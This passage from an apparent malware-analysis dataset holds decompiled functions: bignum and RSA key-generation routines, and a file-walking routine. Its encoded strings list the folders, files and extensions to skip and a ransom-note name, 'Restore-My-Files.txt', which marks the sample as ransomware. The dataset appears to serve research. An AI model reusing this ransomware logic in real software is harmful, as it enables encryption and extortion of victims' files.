        "decompiled_code": "\nuint __cdecl fcn.00403eb0(uint32_t *arg_8h, int32_t *arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    \n    if (arg_10h == 0) {\n        return 0xfffffff4;\n    }\n    if (arg_10h < 0) {\n        return 0xfffffff6;\n    }\n    if (arg_10h == 1) {\n        *arg_8h = 0;\n        return 0;\n    }\n    if (arg_10h != 2) {\n        iVar4 = arg_ch[1];\n        uVar2 = 0;\n        if (iVar4 != 0) {\n            puVar3 = arg_ch[2] + (iVar4 + -1) * 4;\n            do {\n                uVar1 = *puVar3;\n                puVar3 = puVar3 + -1;\n                uVar2 = (uVar1 & 0xffff | (uVar1 >> 0x10 | uVar2 << 0x10) % arg_10h << 0x10) % arg_10h;\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n        }\n        if ((*arg_ch < 0) && (uVar2 != 0)) {\n            uVar2 = arg_10h - uVar2;\n        }\n        *arg_8h = uVar2;\n        return 0;\n    }\n    *arg_8h = *arg_ch[2] & 1;\n    return 0;\n}\n",
        "token_count": 376
    },
    "00404960": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00404960(int32_t arg_8h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t arg_10h;\n    int32_t iVar3;\n    int32_t var_10h;\n    uint var_ch;\n    uint *var_8h;\n    int32_t var_4h;\n    \n    arg_8h_00 = arg_8h;\n    if ((**(arg_8h + 8) & 1) == 0) {\ncode_r0x004049e5:\n        iVar1 = -0xe;\n    }\n    else {\n        var_8h = &arg_8h;\n        var_ch = 1;\n        iVar3 = 0;\n        arg_10h = 3;\n        while( true ) {\n            uVar2 = arg_10h >> 0x1f;\n            arg_8h = (arg_10h ^ uVar2) - uVar2;\n            var_10h = (uVar2 & 0xfffffffe) + 1;\n            iVar1 = fcn.004020a0(arg_8h_00, &var_10h);\n            if (iVar1 < 1) {\n                return 1;\n            }\n            iVar1 = fcn.00403eb0(&var_4h, arg_8h_00, arg_10h);\n            if (iVar1 != 0) break;\n            if (var_4h == 0) goto code_r0x004049e5;\n            arg_10h = *(iVar3 * 4 + 0x4203a4);\n            iVar3 = iVar3 + 1;\n            if (arg_10h < 1) {\n                return 0;\n            }\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 411
    },
    "00405660": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00405660(int32_t arg_8h, uint arg_ch, uint arg_10h, uint32_t arg_14h, int32_t arg_18h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    int32_t arg_8h_01;\n    uint var_30h;\n    uint var_24h;\n    int32_t var_18h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    if (((arg_14h < 0x80) || (arg_18h < 3)) || ((arg_14h & 1) != 0)) {\n        return -0x4080;\n    }\n    var_4h = -(0x400 < arg_14h) & 2;\n    fcn.00403700(&var_18h);\n    fcn.00403700(&var_24h);\n    fcn.00403700(&var_30h);\n    var_ch = arg_8h + 0x14;\n    iVar1 = fcn.00403e10(var_ch, arg_18h);\n    if (iVar1 == 0) {\n        var_8h = arg_14h >> 1;\n        arg_8h_00 = arg_8h + 0x2c;\n        iVar1 = fcn.004032b0(arg_8h_00, var_8h, var_4h, arg_ch, arg_10h);\n        if (iVar1 == 0) {\n            arg_8h_01 = arg_8h + 0x38;\n            do {\n                iVar1 = fcn.004032b0(arg_8h_01, var_8h, var_4h, arg_ch, arg_10h);\n                if ((iVar1 != 0) || (iVar1 = fcn.00404770(&var_18h, arg_8h_00, arg_8h_01),  iVar1 != 0)) break;\n                uVar2 = fcn.00401f60(&var_18h);\n                uVar4 = var_8h - 99;\n                if (arg_14h < 200) {\n                    uVar4 = 0;\n                }\n                if (uVar4 < uVar2) {\n                    if (var_18h < 0) {\n                        fcn.004047e0(arg_8h_00, arg_8h_01);\n                    }\n                    iVar1 = fcn.00404730(arg_8h_00, arg_8h_00, 1);\n                    if (((iVar1 != 0) || (iVar1 = fcn.00404730(arg_8h_01, arg_8h_01, 1),  iVar1 != 0)) ||\n                       ((iVar1 = fcn.00404130(&var_18h, arg_8h_00, arg_8h_01),  iVar1 != 0 ||\n                        (iVar1 = fcn.00403040(&var_24h, var_ch, &var_18h),  iVar1 != 0)))) break;\n                    iVar1 = fcn.00402060(&var_24h, 1);\n                    if (iVar1 == 0) {\n                        iVar1 = fcn.00403040(&var_24h, arg_8h_00, arg_8h_01);\n                        if (((iVar1 != 0) || (iVar1 = fcn.00402260(&var_30h, 0, &var_18h, &var_24h),  iVar1 != 0)) ||\n                           (iVar1 = fcn.00403720(arg_8h + 0x20, var_ch, &var_30h),  iVar1 != 0)) break;\n                        uVar2 = fcn.00401f60(arg_8h + 0x20);\n                        if (arg_14h + 1 >> 1 < uVar2) {\n                            iVar1 = fcn.00401eb0(arg_8h_00, arg_8h_00, 1);\n                            if (((iVar1 == 0) && (iVar1 = fcn.00401eb0(arg_8h_01, arg_8h_01, 1),  iVar1 == 0)) &&\n                               (iVar1 = fcn.00404130(arg_8h + 8, arg_8h_00, arg_8h_01),  iVar1 == 0)) {\n                                uVar3 = fcn.00404640(arg_8h + 8);\n                                *(arg_8h + 4) = uVar3;\n                                iVar1 = fcn.00408140(arg_8h_00, arg_8h_01, arg_8h + 0x20, arg_8h + 0x44, arg_8h + 0x50, \n                                                     arg_8h + 0x5c);\n                                if (iVar1 == 0) {\n                                    iVar1 = fcn.004052d0(arg_8h);\n                                }\n                            }\n                            break;\n                        }\n                    }\n                }\n                iVar1 = fcn.004032b0(arg_8h_00, var_8h, var_4h, arg_ch, arg_10h);\n            } while (iVar1 == 0);\n        }\n    }\n    fcn.00402ff0(&var_18h);\n    fcn.00402ff0(&var_24h);\n    fcn.00402ff0(&var_30h);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    fcn.004055c0(arg_8h);\n    return iVar1 + -0x4180;\n}\n",
        "token_count": 1305
    },
    "0040a5b0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint fcn.0040a5b0(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint uVar6;\n    int32_t in_FS_OFFSET;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_4h = (*_sym.imp.SHELL32.dll_CommandLineToArgvW)(*(*(*(in_FS_OFFSET + 0x30) + 0x10) + 0x44), &var_8h);\n    if (1 < var_8h) {\n        iVar4 = fcn.0041d2e0();\n        pcVar3 = _sym.imp.KERNEL32.dll_SetFileAttributesW;\n        pcVar1 = _sym.imp.KERNEL32.dll_GetFileAttributesW;\n        if (iVar4 != 0) {\n            iVar4 = 1;\n            pcVar2 = _sym.imp.KERNEL32.dll_Sleep;\n            if (1 < var_8h) {\n                do {\n                    uVar5 = (*pcVar1)(*(var_4h + iVar4 * 4));\n                    if (uVar5 != 0xffffffff) {\n                        if ((uVar5 & 0x10) == 0) {\n                            if ((uVar5 & 1) != 0) {\n                                (*pcVar3)(*(var_4h + iVar4 * 4), 0x80);\n                            }\n                            fcn.0041d4f0();\n                        }\n                        else {\n                            fcn.0040acf0();\n                        }\n                    }\n                    iVar4 = iVar4 + 1;\n                    pcVar2 = _sym.imp.KERNEL32.dll_Sleep;\n                } while (iVar4 < var_8h);\n            }\n            do {\n                (*pcVar2)(10);\n            } while (*0x429330 != 0);\n        }\n        (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n        pcVar1 = swi(3);\n        uVar6 = (*pcVar1)();\n        return uVar6;\n    }\n    return 0;\n}\n",
        "token_count": 480
    },
    "0040acf0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040acf0(int16_t *param_1)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int16_t *piVar6;\n    int16_t *piVar7;\n    uint32_t uVar8;\n    uint *puVar9;\n    uint32_t uVar10;\n    uint *puVar11;\n    code *pcVar12;\n    uint lpFileName;\n    uchar auStack2566 [2];\n    uint var_a00h;\n    uint32_t var_7f0h;\n    uint pszPath;\n    uint var_5a0h;\n    uint var_59ch;\n    uint var_598h;\n    uint var_594h;\n    uint var_590h;\n    uint var_58ch;\n    uint var_588h;\n    uint var_584h;\n    uint var_580h;\n    uint var_57ch;\n    uint var_578h;\n    uint var_574h;\n    uint var_570h;\n    uint var_56ch;\n    uint var_568h;\n    uint var_564h;\n    uint var_560h;\n    uint var_55ch;\n    uint var_558h;\n    uint var_554h;\n    uint var_550h;\n    uint var_54ch;\n    uint var_548h;\n    uint var_544h;\n    uint var_540h;\n    uint var_53ch;\n    uint var_538h;\n    uint var_534h;\n    uint var_530h;\n    uint var_52ch;\n    uint var_528h;\n    uint var_524h;\n    uint var_520h;\n    uint var_51ch;\n    uint var_518h;\n    uint var_514h;\n    uint var_510h;\n    uint var_50ch;\n    uint var_508h;\n    uint var_504h;\n    uint var_500h;\n    uint var_4fch;\n    uint var_4f8h;\n    uint var_4f4h;\n    uint var_4f0h;\n    uint var_4ech;\n    uint var_4e8h;\n    uint var_4e4h;\n    uint var_4e0h;\n    uint var_4dch;\n    uint var_4d8h;\n    uint var_4d4h;\n    uint var_4d0h;\n    uint var_4cch;\n    uint var_4c8h;\n    uint var_4c4h;\n    uint var_4c0h;\n    uint var_4bch;\n    uint var_4b8h;\n    uint var_4b4h;\n    uint var_4b0h;\n    uint var_4ach;\n    uint var_4a8h;\n    uint var_4a4h;\n    uint var_4a0h;\n    uint var_49ch;\n    uint var_498h;\n    uint var_494h;\n    uint var_490h;\n    uint var_48ch;\n    uint var_488h;\n    uint var_484h;\n    uint var_480h;\n    uint var_47ch;\n    uint var_478h;\n    uint var_474h;\n    uint var_470h;\n    uint var_46ch;\n    uint var_468h;\n    uint var_464h;\n    uint var_460h;\n    uint var_45ch;\n    uint var_458h;\n    uint var_454h;\n    uint var_450h;\n    uint var_44ch;\n    uint var_448h;\n    uint var_444h;\n    uint var_440h;\n    uint var_43ch;\n    uint var_438h;\n    uint var_434h;\n    uint var_430h;\n    uint var_42ch;\n    uint var_428h;\n    uint var_424h;\n    uint var_420h;\n    uint var_41ch;\n    uint var_418h;\n    uint var_414h;\n    uint var_410h;\n    uint var_40ch;\n    uint var_408h;\n    uint var_404h;\n    uint var_400h;\n    uint var_3fch;\n    uint var_3f8h;\n    uint var_3f4h;\n    uint var_3f0h;\n    uint var_3ech;\n    uint var_3e8h;\n    uint var_3e4h;\n    uint var_3e0h;\n    uint var_3dch;\n    uint var_3d8h;\n    uint var_3d4h;\n    uint var_3d0h;\n    uint var_3cch;\n    uint var_3c8h;\n    uint var_3c4h;\n    uint var_3c0h;\n    uint var_3bch;\n    uint var_3b8h;\n    uint var_3b4h;\n    uint var_3b0h;\n    uint var_3ach;\n    uint var_3a8h;\n    uint var_3a4h;\n    uint var_3a0h;\n    uint var_39ch;\n    uint var_398h;\n    uint var_394h;\n    uint var_390h;\n    uint var_38ch;\n    uint var_388h;\n    uint var_384h;\n    uint var_380h;\n    uint var_37ch;\n    uint var_378h;\n    uint var_374h;\n    uint var_370h;\n    uint var_36ch;\n    uint var_368h;\n    uint var_364h;\n    uint var_360h;\n    uint var_35ch;\n    uint var_358h;\n    uint var_354h;\n    uint var_350h;\n    uint var_34ch;\n    uint var_348h;\n    uint var_344h;\n    uint var_340h;\n    uint var_33ch;\n    uint var_338h;\n    uint var_334h;\n    uint var_330h;\n    uint var_32ch;\n    uint var_328h;\n    uint var_324h;\n    uint var_320h;\n    uint var_31ch;\n    uint var_318h;\n    uint var_314h;\n    uint var_310h;\n    uint var_30ch;\n    uint var_308h;\n    uint var_304h;\n    uint var_300h;\n    uint var_2fch;\n    uint var_2f8h;\n    uint var_2f4h;\n    uint var_2f0h;\n    uint var_2ech;\n    uint var_2e8h;\n    uint var_2e4h;\n    uint var_2e0h;\n    uint var_2dch;\n    uint var_2d8h;\n    uint var_2d4h;\n    uint var_2d0h;\n    uint var_2cch;\n    uint var_2c8h;\n    uint var_2c4h;\n    uint var_2c0h;\n    uint var_2bch;\n    uint var_2b8h;\n    uint var_2b4h;\n    uint var_2b0h;\n    uint var_2ach;\n    uint var_2a8h;\n    uint var_2a4h;\n    uint var_2a0h;\n    uint var_29ch;\n    uint var_298h;\n    uint var_294h;\n    uint var_290h;\n    uint var_28ch;\n    uint var_288h;\n    uint var_284h;\n    uint var_280h;\n    uint var_27ch;\n    uint var_278h;\n    uint var_274h;\n    uint var_270h;\n    uint var_26ch;\n    uint var_268h;\n    uint var_264h;\n    uint var_260h;\n    uint var_25ch;\n    uint var_258h;\n    uint var_254h;\n    uint var_250h;\n    uint var_24ch;\n    uint var_248h;\n    uint var_244h;\n    uint var_240h;\n    uint var_23ch;\n    uint var_238h;\n    uint var_234h;\n    uint var_230h;\n    uint var_22ch;\n    uint var_228h;\n    uint var_224h;\n    uint var_220h;\n    uint var_21ch;\n    uint var_218h;\n    uint var_214h;\n    uint var_210h;\n    uint var_20ch;\n    uint var_208h;\n    uint var_204h;\n    uint var_200h;\n    uint var_1fch;\n    uint var_1f8h;\n    uint var_1f4h;\n    uint var_1f0h;\n    uint var_1ech;\n    uint var_1e8h;\n    uint var_1e4h;\n    uint var_1e0h;\n    uint var_1dch;\n    uint var_1d8h;\n    uint var_1d4h;\n    uint var_1d0h;\n    uint var_1cch;\n    uint var_1c8h;\n    uint var_1c4h;\n    uint var_1c0h;\n    uint var_1bch;\n    uint var_1b8h;\n    uint var_1b4h;\n    uint var_1b0h;\n    uint var_1ach;\n    uint var_1a8h;\n    uint var_1a4h;\n    uint var_1a0h;\n    uint var_19ch;\n    uint var_198h;\n    uint var_194h;\n    uint var_190h;\n    uint var_18ch;\n    uint var_188h;\n    uint var_184h;\n    uint var_180h;\n    uint var_17ch;\n    uint var_178h;\n    uint var_174h;\n    uint var_170h;\n    uint var_16ch;\n    uint var_168h;\n    uint var_164h;\n    uint var_160h;\n    uint var_15ch;\n    uint var_158h;\n    uint var_154h;\n    uint var_150h;\n    uint var_14ch;\n    uint var_148h;\n    uint var_144h;\n    uint var_140h;\n    uint var_13ch;\n    uint var_138h;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_120h;\n    uint var_11ch;\n    uint var_118h;\n    uint var_114h;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint var_fch;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint ARG_1;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int16_t *var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    ARG_1 = 0x730025;\n    var_1ch = 0x2a005c;\n    var_18h._0_2_ = 0;\n    var_ch = param_1;\n    (*_sym.imp.USER32.dll_wsprintfW)(&lpFileName, &ARG_1, param_1);\n    iVar4 = (*_sym.imp.KERNEL32.dll_FindFirstFileExW)(&lpFileName, 0, &var_7f0h, 0, 0, 0);\n    pcVar2 = _sym.imp.KERNEL32.dll_lstrcmpiW;\n    if (iVar4 != -1) {\n        var_3ech = 0x770024;\n        var_3e8h = 0x6e0069;\n        var_3e4h = 0x6f0064;\n        var_3e0h = 0x730077;\n        var_3dch = 0x7e002e;\n        var_3d8h = 0x740062;\n        var_3d4h._0_2_ = 0;\n        var_20ch = 0x6e0069;\n        var_208h = 0x650074;\n        var_204h = 0x6c;\n        var_2bch = 0x73006d;\n        var_2b8h = 0x63006f;\n        var_2b4h = 0x630061;\n        var_2b0h = 0x650068;\n        var_2ach._0_2_ = 0;\n        var_408h = 0x720024;\n        var_404h = 0x630065;\n        var_400h = 0x630079;\n        var_3fch = 0x65006c;\n        var_3f8h = 0x62002e;\n        var_3f4h = 0x6e0069;\n        var_3f0h._0_2_ = 0;\n        var_424h = 0x770024;\n        var_420h = 0x6e0069;\n        var_41ch = 0x6f0064;\n        var_418h = 0x730077;\n        var_414h = 0x7e002e;\n        var_410h = 0x730077;\n        var_40ch._0_2_ = 0;\n        var_3a0h = 0x6f0074;\n        var_39ch = 0x200072;\n        var_398h = 0x720062;\n        var_394h = 0x77006f;\n        var_390h = 0x650073;\n        var_38ch = 0x72;\n        var_2ch = 0x6f0062;\n        var_28h = 0x74006f;\n        var_24h._0_2_ = 0;\n        var_388h = 0x690057;\n        var_384h = 0x64006e;\n        var_380h = 0x77006f;\n        var_37ch = 0x200073;\n        var_378h = 0x74006e;\n        var_374h._0_2_ = 0;\n        var_298h = 0x73004d;\n        var_294h = 0x750062;\n        var_290h = 0x6c0069;\n        var_28ch = 100;\n        var_334h = 0x69004d;\n        var_330h = 0x720063;\n        var_32ch = 0x73006f;\n        var_328h = 0x66006f;\n        var_324h = 0x74;\n        var_348h = 0x6c0041;\n        var_344h = 0x20006c;\n        var_340h = 0x730075;\n        var_33ch = 0x720065;\n        var_338h = 0x73;\n        var_5a0h = 0x790073;\n        var_59ch = 0x740073;\n        var_598h = 0x6d0065;\n        var_594h = 0x760020;\n        var_590h = 0x6c006f;\n        var_58ch = 0x6d0075;\n        var_588h = 0x200065;\n        var_584h = 0x6e0069;\n        var_580h = 0x6f0066;\n        var_57ch = 0x6d0072;\n        var_578h = 0x740061;\n        var_574h = 0x6f0069;\n        var_570h = 0x6e;\n        var_2d0h = 0x650070;\n        var_2cch = 0x660072;\n        var_2c8h = 0x6f006c;\n        var_2c4h = 0x730067;\n        var_2c0h._0_2_ = 0;\n        var_258h = 0x6f0067;\n        var_254h = 0x67006f;\n        var_250h = 0x65006c;\n        var_24ch._0_2_ = 0;\n        var_4f8h = 0x700061;\n        var_4f4h = 0x6c0070;\n        var_4f0h = 0x630069;\n        var_4ech = 0x740061;\n        var_4e8h = 0x6f0069;\n        var_4e4h = 0x20006e;\n        var_4e0h = 0x610064;\n        var_4dch = 0x610074;\n        var_4d8h._0_2_ = 0;\n        var_278h = 0x690077;\n        var_274h = 0x64006e;\n        var_270h = 0x77006f;\n        var_26ch = 0x73;\n        var_3b8h = 0x690077;\n        var_3b4h = 0x64006e;\n        var_3b0h = 0x77006f;\n        var_3ach = 0x2e0073;\n        var_3a8h = 0x6c006f;\n        var_3a4h = 100;\n        var_288h = 0x700061;\n        var_284h = 0x640070;\n        var_280h = 0x740061;\n        var_27ch = 0x61;\n        var_2a8h = 0x6f006d;\n        var_2a4h = 0x69007a;\n        var_2a0h = 0x6c006c;\n        var_29ch = 0x61;\n        var_494h = 0x69004d;\n        var_490h = 0x720063;\n        var_48ch = 0x73006f;\n        var_488h = 0x66006f;\n        var_484h = 0x2e0074;\n        var_480h = 0x45004e;\n        var_47ch = 0x54;\n        var_51ch = 0x69006d;\n        var_518h = 0x720063;\n        var_514h = 0x73006f;\n        var_510h = 0x66006f;\n        var_50ch = 0x200074;\n        var_508h = 0x680073;\n        var_504h = 0x720061;\n        var_500h = 0x640065;\n        var_4fch._0_2_ = 0;\n        var_540h = 0x6e0049;\n        var_53ch = 0x650074;\n        var_538h = 0x6e0072;\n        var_534h = 0x740065;\n        var_530h = 0x450020;\n        var_52ch = 0x700078;\n        var_528h = 0x6f006c;\n        var_524h = 0x650072;\n        var_520h = 0x72;\n        var_440h = 0x6f0063;\n        var_43ch = 0x6d006d;\n        var_438h = 0x6e006f;\n        var_434h = 0x660020;\n        var_430h = 0x6c0069;\n        var_42ch = 0x730065;\n        var_428h._0_2_ = 0;\n        var_218h = 0x70006f;\n        var_214h = 0x720065;\n        var_210h = 0x61;\n        var_4d4h = 0x690057;\n        var_4d0h = 0x64006e;\n        var_4cch = 0x77006f;\n        var_4c8h = 0x200073;\n        var_4c4h = 0x6f004a;\n        var_4c0h = 0x720075;\n        var_4bch = 0x61006e;\n        var_4b8h = 0x6c;\n        var_248h = 0x74006e;\n        var_244h = 0x64006c;\n        var_240h = 0x72;\n        var_4b4h = 0x74006e;\n        var_4b0h = 0x730075;\n        var_4ach = 0x720065;\n        var_4a8h = 0x64002e;\n        var_4a4h = 0x740061;\n        var_4a0h = 0x6c002e;\n        var_49ch = 0x67006f;\n        var_498h._0_2_ = 0;\n        var_45ch = 0x6f0062;\n        var_458h = 0x74006f;\n        var_454h = 0x650073;\n        var_450h = 0x740063;\n        var_44ch = 0x62002e;\n        var_448h = 0x6b0061;\n        var_444h._0_2_ = 0;\n        var_3d0h = 0x750061;\n        var_3cch = 0x6f0074;\n        var_3c8h = 0x750072;\n        var_3c4h = 0x2e006e;\n        var_3c0h = 0x6e0069;\n        var_3bch = 0x66;\n        var_370h = 0x680074;\n        var_36ch = 0x6d0075;\n        var_368h = 0x730062;\n        var_364h = 0x64002e;\n        var_360h = 0x62;\n        var_478h = 0x630069;\n        var_474h = 0x6e006f;\n        var_470h = 0x610063;\n        var_46ch = 0x680063;\n        var_468h = 0x2e0065;\n        var_464h = 0x620064;\n        var_460h._0_2_ = 0;\n        var_56ch = 0x650052;\n        var_568h = 0x740073;\n        var_564h = 0x72006f;\n        var_560h = 0x2d0065;\n        var_55ch = 0x79004d;\n        var_558h = 0x46002d;\n        var_554h = 0x6c0069;\n        var_550h = 0x730065;\n        var_54ch = 0x74002e;\n        var_548h = 0x740078;\n        var_544h._0_2_ = 0;\n        var_8h = 0x2e;\n        var_14h = 0x2e002e;\n        var_10h._0_2_ = 0;\n        var_224h = 0x730025;\n        var_220h = 0x25005c;\n        var_21ch = 0x73;\n        var_38h = 0x33002e;\n        var_34h = 0x360038;\n        var_30h._0_2_ = 0;\n        var_44h = 0x63002e;\n        var_40h = 0x64006d;\n        var_3ch._0_2_ = 0;\n        var_5ch = 0x61002e;\n        var_58h = 0x69006e;\n        var_54h._0_2_ = 0;\n        var_68h = 0x61002e;\n        var_64h = 0x760064;\n        var_60h._0_2_ = 0;\n        var_268h = 0x74002e;\n        var_264h = 0x650068;\n        var_260h = 0x65006d;\n        var_25ch._0_2_ = 0;\n        var_74h = 0x6d002e;\n        var_70h = 0x690073;\n        var_6ch._0_2_ = 0;\n        var_80h = 0x6d002e;\n        var_7ch = 0x700073;\n        var_78h._0_2_ = 0;\n        var_8ch = 0x63002e;\n        var_88h = 0x6d006f;\n        var_84h._0_2_ = 0;\n        var_2e4h = 0x64002e;\n        var_2e0h = 0x610069;\n        var_2dch = 0x700067;\n        var_2d8h = 0x67006b;\n        var_2d4h._0_2_ = 0;\n        var_98h = 0x6e002e;\n        var_94h = 0x73006c;\n        var_90h._0_2_ = 0;\n        var_2f8h = 0x64002e;\n        var_2f4h = 0x610069;\n        var_2f0h = 0x630067;\n        var_2ech = 0x620061;\n        var_2e8h._0_2_ = 0;\n        var_230h = 0x6c002e;\n        var_22ch = 0x63006f;\n        var_228h = 0x6b;\n        var_a4h = 0x6f002e;\n        var_a0h = 0x780063;\n        var_9ch._0_2_ = 0;\n        var_b0h = 0x6d002e;\n        var_ach = 0x610070;\n        var_a8h._0_2_ = 0;\n        var_bch = 0x63002e;\n        var_b8h = 0x6c0070;\n        var_b4h._0_2_ = 0;\n        var_c8h = 0x6d002e;\n        var_c4h = 0x64006f;\n        var_c0h._0_2_ = 0;\n        var_d4h = 0x68002e;\n        var_d0h = 0x610074;\n        var_cch._0_2_ = 0;\n        var_23ch = 0x69002e;\n        var_238h = 0x6e0063;\n        var_234h = 0x73;\n        var_e0h = 0x70002e;\n        var_dch = 0x660072;\n        var_d8h._0_2_ = 0;\n        var_ech = 0x72002e;\n        var_e8h = 0x700074;\n        var_e4h._0_2_ = 0;\n        var_30ch = 0x64002e;\n        var_308h = 0x610069;\n        var_304h = 0x630067;\n        var_300h = 0x670066;\n        var_2fch._0_2_ = 0;\n        var_35ch = 0x6d002e;\n        var_358h = 0x730073;\n        var_354h = 0x790074;\n        var_350h = 0x65006c;\n        var_34ch = 0x73;\n        var_200h = 0x72002e;\n        var_1fch = 0x700064;\n        var_1f8h._0_2_ = 0;\n        var_f8h = 0x62002e;\n        var_f4h = 0x6e0069;\n        var_f0h._0_2_ = 0;\n        var_104h = 0x68002e;\n        var_100h = 0x70006c;\n        var_fch._0_2_ = 0;\n        var_110h = 0x73002e;\n        var_10ch = 0x730068;\n        var_108h._0_2_ = 0;\n        var_11ch = 0x64002e;\n        var_118h = 0x760072;\n        var_114h._0_2_ = 0;\n        var_128h = 0x77002e;\n        var_124h = 0x780070;\n        var_120h._0_2_ = 0;\n        var_134h = 0x62002e;\n        var_130h = 0x740061;\n        var_12ch._0_2_ = 0;\n        var_140h = 0x72002e;\n        var_13ch = 0x6d006f;\n        var_138h._0_2_ = 0;\n        var_14ch = 0x6d002e;\n        var_148h = 0x630073;\n        var_144h._0_2_ = 0;\n        var_158h = 0x73002e;\n        var_154h = 0x6c0070;\n        var_150h._0_2_ = 0;\n        var_164h = 0x70002e;\n        var_160h = 0x310073;\n        var_15ch._0_2_ = 0;\n        var_170h = 0x6d002e;\n        var_16ch = 0x750073;\n        var_168h._0_2_ = 0;\n        var_17ch = 0x69002e;\n        var_178h = 0x730063;\n        var_174h._0_2_ = 0;\n        var_188h = 0x6b002e;\n        var_184h = 0x790065;\n        var_180h._0_2_ = 0;\n        var_50h = 0x65002e;\n        var_4ch = 0x650078;\n        var_48h._0_2_ = 0;\n        var_1ach = 0x64002e;\n        var_1a8h = 0x6c006c;\n        var_1a4h._0_2_ = 0;\n        var_1f4h = 0x6c002e;\n        var_1f0h = 0x6b006e;\n        var_1ech._0_2_ = 0;\n        var_1e8h = 0x69002e;\n        var_1e4h = 0x6f0063;\n        var_1e0h._0_2_ = 0;\n        var_1dch = 0x68002e;\n        var_1d8h = 0x70006c;\n        var_1d4h._0_2_ = 0;\n        var_1d0h = 0x73002e;\n        var_1cch = 0x730079;\n        var_1c8h._0_2_ = 0;\n        var_1c4h = 0x69002e;\n        var_1c0h = 0x780064;\n        var_1bch._0_2_ = 0;\n        var_1b8h = 0x69002e;\n        var_1b4h = 0x69006e;\n        var_1b0h._0_2_ = 0;\n        var_1a0h = 0x72002e;\n        var_19ch = 0x670065;\n        var_198h._0_2_ = 0;\n        var_194h = 0x6d002e;\n        var_190h = 0x330070;\n        var_18ch._0_2_ = 0;\n        var_320h = 0x6c002e;\n        var_31ch = 0x63006f;\n        var_318h = 0x62006b;\n        var_314h = 0x740069;\n        var_310h._0_2_ = 0;\n        pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW;\n        var_4h = iVar4;\n        do {\n            iVar5 = (*pcVar2)(&var_8h, &pszPath);\n            if ((iVar5 != 0) && (iVar5 = (*pcVar2)(&var_14h, &pszPath),  iVar5 != 0)) {\n                if ((var_7f0h & 0x10) == 0) {\n                    iVar5 = 0;\n                    puVar9 = &pszPath;\n                    if (pszPath != 0) {\n                        do {\n                            puVar9 = puVar9 + 2;\n                            iVar5 = iVar5 + 1;\n                        } while (*puVar9 != 0);\n                        if (4 < iVar5) {\n                            piVar6 = (*_sym.imp.SHLWAPI.dll_PathFindExtensionW)(&pszPath);\n                            if ((piVar6 != NULL) && (iVar5 = 0,  piVar7 = piVar6,  *piVar6 != 0)) {\n                                do {\n                                    piVar7 = piVar7 + 1;\n                                    iVar5 = iVar5 + 1;\n                                } while (*piVar7 != 0);\n                                if ((0 < iVar5) &&\n                                   ((((((((iVar5 = (*pcVar2)(&var_38h, piVar6), \n                                          pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar5 == 0 ||\n                                          (iVar5 = (*pcVar2)(&var_44h, piVar6), \n                                          pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar5 == 0)) ||\n                                         (iVar5 = (*pcVar2)(&var_50h, piVar6), \n                                         pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar5 == 0)) ||\n                                        (((iVar5 = (*pcVar2)(&var_5ch, piVar6), \n                                          pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar5 == 0 ||\n                                          (iVar5 = (*pcVar2)(&var_68h, piVar6), \n                                          pcVar12 = _sym.imp.KERNEL32.dll_FindNextFileW,  iVar5 == 0)) ||\n                                         ((iVar5 = (*pcVar2)(&var_268h, piVar6), \n                                          pcVar12 = 